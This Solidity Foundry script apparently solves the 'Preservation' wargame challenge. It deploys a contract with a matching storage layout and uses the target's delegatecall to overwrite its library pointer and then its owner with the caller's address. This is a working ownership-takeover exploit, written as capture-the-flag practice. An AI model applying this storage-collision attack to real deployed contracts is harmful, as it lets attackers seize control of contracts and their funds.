// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Preservation} from "./../src/Preservation.sol";

contract PreservationScript is Script {
    function run() public {
        uint256 pk = vm.envUint("PK");

        Preservation preservation = Preservation(vm.envAddress("PRESERVATION_INSTANCE"));

        console.log("0_timeZone1Library: ", preservation.timeZone1Library());
        console.log("0_timeZone2Library: ", preservation.timeZone2Library());
        console.log("0_owner: ", preservation.owner());

        vm.startBroadcast(pk);
        preservation.setFirstTime(uint256(uint160(address(new PreservationExecutor()))));
        console.log("1_timeZone1Library: ", preservation.timeZone1Library());
        console.log("1_timeZone2Library: ", preservation.timeZone2Library());
        console.log("1_owner: ", preservation.owner());
        preservation.setFirstTime(uint256(uint160(vm.addr(pk))));
        console.log("2_timeZone1Library: ", preservation.timeZone1Library());
        console.log("2_timeZone2Library: ", preservation.timeZone2Library());
        console.log("2_owner: ", preservation.owner());
        vm.stopBroadcast();
    }

    // forge script script/GatekeeperTwoScript.s.sol:GatekeeperTwoScript --broadcast
}

contract PreservationExecutor {
    address bullshit0;
    address bullshit1;
    address owner;

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
